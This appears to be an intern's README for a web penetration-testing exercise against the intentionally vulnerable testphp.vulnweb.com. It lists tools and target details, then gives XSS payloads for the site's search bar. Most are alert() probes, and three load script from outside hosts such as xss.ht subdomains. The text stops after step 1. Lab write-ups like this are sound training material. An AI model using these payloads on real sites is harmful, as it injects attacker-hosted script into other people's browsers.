# CODTECH-Task2


# WEB APPLICATION PENETRATION TESTING
# Personal information

* Name : Patel Mihir

* Company : CODTECH IT SOLUTIONS PVT.LTD

* ID : CT08DAB

* Domain : Cyber Security & Ethical Hacking

* Duration: 20th Dec 2024 To 20th Jan 2025

* Mentor : Neela Santhosh kumar

# Overview

* Web Application Penetration Testing involves identifying and exploiting security vulnerabilities in web applications to ensure they are secure against potential attacks. This process focuses on vulnerabilities like SQL injection, cross-site scripting (XSS), and insecure authentication mechanisms.

# objective

1. Identify vulnerabilities
2. Exploit weaknesses to understand potential attacks
3. Recommend remediation to enhance security

# Tools used in web application Testing

- sqlmap
- burpsuite
- nmap
- nikto
- dirb
- owasp zap
- Metasploit Framework
- nessus etc.

# focus vulnerabilities

- cross site scripting (XSS)
- SQL injection
- insecure authentication
- open redirect etc.

# Performed Task
# Details of site where we performed the web application Testing

- Site Name : http://testphp.vulnweb.com
- IP address : 44.228.249.3
- Web server : HTTPServer[nginx/1.19.0]
- technology used : 1. PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1] , 2. Script[text/JavaScript]
- Port : 80 [http] open

# Performed Testing on testphp.vulnweb.com

# 1. XSS Vulnerability

step 1 : Now first open the site and write xss payload on serachbar.

    <script>alert("XSS vulnerability found")</script>  
<br> 

    <script>alert(1)</script>    
<br> 

    <script>alert(document.domain.concat("\n").concat(window.origin))</script>    
<br> 

    <img src=x onerror=alert('XSS');>    
<br>  

    "><script src="https://js.rip/<custom.name>"></script>

    "><script src=//<custom.subdomain>.xss.ht></script> 

    <script>$.getScript("//<custom.subdomain>.xss.ht")</script>     


